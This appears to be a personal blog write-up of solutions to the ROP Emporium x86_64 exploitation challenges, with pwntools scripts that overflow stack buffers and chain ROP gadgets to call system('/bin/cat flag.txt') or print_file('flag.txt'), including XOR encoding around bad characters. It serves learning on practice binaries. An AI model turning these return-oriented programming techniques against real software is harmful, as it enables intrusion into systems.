---
layout: default
title: "ROP emporium"
category: "pwn"
tags: [x86_64, rop]
date: 2026-09-09
description: "my solutions for the challenges of the ROP emporium series"
---

* TOC
{:toc}

## ret2win
basic ret2win challenge, no mitigations
our input length is not properly checked, which results
to a return address overwrite to point to win()

```python
from pwn import *
p = process('./ret2win')

payload = b'A'*40 + p64(0x400756)
p.recvuntil(b'> ')
p.send(payload)

p.interactive()
```

## split
in this challenge one thing changes
1. there is no win() function

however, according to the challenge description there is a ready to use `'/bin/cat flag.txt'`.
paired with a `system()` call and a `pop rdi; ret` gadget, a pop rdi gadget basically loads
anything we want in the rdi register which according to the x86_x64 calling convention is the first
argument of any function, so what we want to do with the info we are given is to call `system('/bin/cat flag.txt')`,

we had to find the addresses for the pop rdi gadget, the system call and the string we need to use through gdb,
thankfully there are intentionally placed functions and strings in the binary which give us these for free:
```
pwndbg> disas usefulFunction
Dump of assembler code for function usefulFunction:
   0x0000000000400742 <+0>:     push   rbp
   0x0000000000400743 <+1>:     mov    rbp,rsp
   0x0000000000400746 <+4>:     mov    edi,0x40084a
   0x000000000040074b <+9>:     call   0x400560 <system@plt>
   0x0000000000400750 <+14>:    nop
   0x0000000000400751 <+15>:    pop    rbp
   0x0000000000400752 <+16>:    ret
```
```
pwndbg> x/gs &usefulString
0x601060 <usefulString>:        "/bin/cat flag.txt"
```
```
$ ROPgadget --binary split --only "pop|ret"
Gadgets information
============================================================
0x00000000004007bc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007be : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007c0 : pop r14 ; pop r15 ; ret
0x00000000004007c2 : pop r15 ; ret
0x00000000004007bb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007bf : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400618 : pop rbp ; ret
0x00000000004007c3 : pop rdi ; ret <------ this is the gadget we want
0x00000000004007c1 : pop rsi ; pop r15 ; ret
0x00000000004007bd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040053e : ret
0x0000000000400542 : ret 0x200a

Unique gadgets found: 12
```

we finally construct the solve script using these addresses:

```python
from pwn import *

elf = ELF('./split')
io = process(elf.path)
rop = ROP(elf)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
call_system = 0x40074b
cat_flag = 0x601060

payload = flat(
	b'A' * 40,
	p64(pop_rdi),
	p64(cat_flag),
	p64(call_system)
)

io.send(payload)
io.interactive()
```

## callme
this challenge tasks us with calling 3 different plt function entries with 3 arguments

-  the plt (procedure linkage table) is a mechanism which links our executable code with external libraries' code, because of aslr, external libraries are always loaded into random memory addresses, the plt uses predictable addresses to call those external functions so the compiler doesn`t need to guess the addresses, the good thing about the plt is that in the end we don't need to guess them to write our exploit neither (except if PIE is enabled, but it doesn't matter for this challenge as it is turned off)

we are asked to call `callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)`, `callme_two(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)`, `callme_three(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)`

since we don't know the actual addresses of these functions in the external library we leverage the plt which uses fixed addresses (no PIE), we also apply the same concept from the previous challenge except we have to
use three arguments, in the x86_64 calling convention the first 3 arguments of a function are in this order rdi, rsi, rdx, with rdi being the first argument and rdx being the 3rd, we construct the final solve script based
on these principles:

```python
from pwn import *

context.log_level = 'debug'

elf = ELF('./callme')
rop = ROP(elf)
io = process(elf.path)

offset = 40

pop_rdi_rsi_rdx = rop.find_gadget(['pop rdi','pop rsi','pop rdx','ret'])[0]

arg1 = 0xdeadbeefdeadbeef
arg2 = 0xcafebabecafebabe
arg3 = 0xd00df00dd00df00d

callme_one_plt = elf.plt['callme_one']
callme_two_plt = elf.plt['callme_two']
callme_three_plt = elf.plt['callme_three']

payload = b'A' * offset

def build_call(func):
	chain = p64(pop_rdi_rsi_rdx)
	chain += p64(arg1)
	chain += p64(arg2)
	chain += p64(arg3)
	chain += p64(func)
	return chain

payload += build_call(callme_one_plt)
payload += build_call(callme_two_plt)
payload += build_call(callme_three_plt)

io.sendlineafter(b'> ', payload)
io.interactive()
```

## write4

in this challenge there is no free `'/bin/cat flag.txt'` nor free `system()` call or `win()` function
however there is a plt entry of a `print_file()` function which just opens the file of our choice, but
how do we open flag.txt???

using a `mov [reg1], reg2` gadget from the binary which takes the contents of reg2 and moves it into what is in the memory address of reg1,
we use this gadget to write the flag.txt file name into the .bss section of the binary (uninitialized data) and then use the traditional pop rdi
gadget to do `print_file("flag.txt")` (we point the rdi register to the .bss section where we wrote 'flag.txt'):

```python
from pwn import *

context.log_level = 'debug'

elf = ELF('./write4')
rop = ROP(elf)
io = process(elf.path)

offset = 40
print_file = elf.plt['print_file']

mov_r14_r15 = 0x400628
pop_r14_r15 = rop.find_gadget(['pop r14','pop r15','ret'])[0]
ret = rop.find_gadget(['ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]

payload = b'A' * offset

payload += p64(pop_r14_r15)
payload += p64(elf.bss() + 0x200)      
payload += b"flag.txt"             
payload += p64(mov_r14_r15)      

payload += p64(pop_rdi)
payload += p64(elf.bss() + 0x200)       
payload += p64(print_file)     

io.sendlineafter(b'> ', payload)
io.interactive()
```

## badchars

this challenge has a quirk, there is a filter for certain bytes of input we send through, however the challenge
gives us a hint: `Think about how we're going to overcome the badchars issue; should we try to avoid them entirely, or could we use gadgets to change our string once it's in memory?`,
so we have to modify our data after it is loaded memory, we use a `xor reg1, reg2` gadget with a xor key value of 2 to xor the 'flag.txt' string to send it encoded (while also not transforming it into any other illegal bytes) and then using our xor gadget we xor it while it is already in memory to gain the original 'flag.txt' string and proceed with the exploit  

besides all of that, every other concept is the same to the previous challenges: 

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

elf = ELF('./badchars')
rop = ROP(elf)
io = process(elf.path)

bss = elf.bss()  
print_file = elf.plt['print_file']

flag_str = b"flag.txt"
xor_key = 2

pop_r12_r13_r14_r15 = 0x40069c           
mov_r13_r12 = 0x400634         
xor_r15_r14 = 0x400628         
ret = 0x4004ee         
pop_rdi = 0x4006a3           

encoded_string = bytearray()
for char in flag_str:
    encoded_char = char ^ xor_key
    encoded_string.append(encoded_char)
encoded_string = bytes(encoded_string)

offset = 40
payload = b'A' * offset

payload += p64(pop_r12_r13_r14_r15)        
payload += encoded_string        
payload += p64(bss)    
payload += p64(0)                
payload += p64(0)                
payload += p64(mov_r13_r12)       

for index in range(len(flag_str)):
    payload += p64(pop_r12_r13_r14_r15)   
    payload += p64(0)            
    payload += p64(0)            
    payload += p64(xor_key)      
    payload += p64(bss + index) 
    payload += p64(xor_r15_r14)   
      
payload += p64(pop_rdi)
payload += p64(bss)    
payload += p64(print_file)

io.sendlineafter(b'> ', payload)
io.interactive()
```

## fluff

in this challenge most of the useful gadgets provided to us are gone, instead we have some obscure gadgets gathered in `usefulFunction()`

```
pwndbg> disas questionableGadgets
Dump of assembler code for function questionableGadgets:
   0x0000000000400628 <+0>:     xlat   BYTE PTR ds:[rbx]
   0x0000000000400629 <+1>:     ret
   0x000000000040062a <+2>:     pop    rdx
   0x000000000040062b <+3>:     pop    rcx
   0x000000000040062c <+4>:     add    rcx,0x3ef2
   0x0000000000400633 <+11>:    bextr  rbx,rcx,rdx
   0x0000000000400638 <+16>:    ret
   0x0000000000400639 <+17>:    stos   BYTE PTR es:[rdi],al
   0x000000000040063a <+18>:    ret
   0x000000000040063b <+19>:    nop    DWORD PTR [rax+rax*1+0x0]
End of assembler dump.
```
1. `bextr rbx, rcx, rdx`: this gadget controls the rbx register. bextr extracts bits from rcx based on the control value in rdx. By popping 0x4000 into rdx (start at bit 0, extract 64 bits), the instruction simply copies rcx into rbx. because the gadget adds 0x3ef2 to rcx before the copy, we have to substract 0x3ef2 from the target value before pushing it to the stack to cancel out the addition
2. `xlat BYTE PTR ds:[rbx]`: xlat adds rbx and al together, treats the sum as a memory address, reads the byte at that address, and places it into al. We use this to pull characters (the flag chars) that already exist inside memory into the al register
3. `stos BYTE PTR es:[rdi],al`: stos writes the byte currently in al to the memory address stored in rdi, it then automatically increments rdi by 1, perfectly positioning the pointer for the next byte write

in combination, we use the bextr gadget which takes our compensated offset from the stack and places it in the rbx register so the next xlat gadget looks exactly where we want, then with the xlat gadget uses the offset in rbx to look up a specific character in memory and loads that character into the al register and lastly, the stos gadget takes the character now sitting in al, writes it into the .bss section, and increments the rdi pointer by one to do another loop for the next char

the solve script:
```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

elf = ELF('./fluff')
rop = ROP(elf)
io = process(elf.path)

off = 40
bss = elf.bss()
flag = b'flag.txt'
print_file = elf.plt['print_file']
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
ret = rop.find_gadget(['ret'])[0]
xlatb_rbx = 0x400628
bextr_rbx_rcx_rdx  = 0x40062a
stosb_rdi_al  = 0x400639

payload = b'A' * off
payload += p64(pop_rdi)
payload += p64(bss)

al = 0xb

for char in flag:
	char_addr = next(elf.search(bytes([char])))
	req_rbx = char_addr - al
	
	payload += p64(bextr_rbx_rcx_rdx)
	payload += p64(0x4000)
	payload += p64(req_rbx - 0x3ef2)

	payload += p64(xlatb_rbx)

	payload += p64(stosb_rdi_al)

	al = char

payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(ret)
payload += p64(print_file)

io.recvuntil(b'> ')
io.sendline(payload)

io.interactive()
```
## pivot

## ret2csu


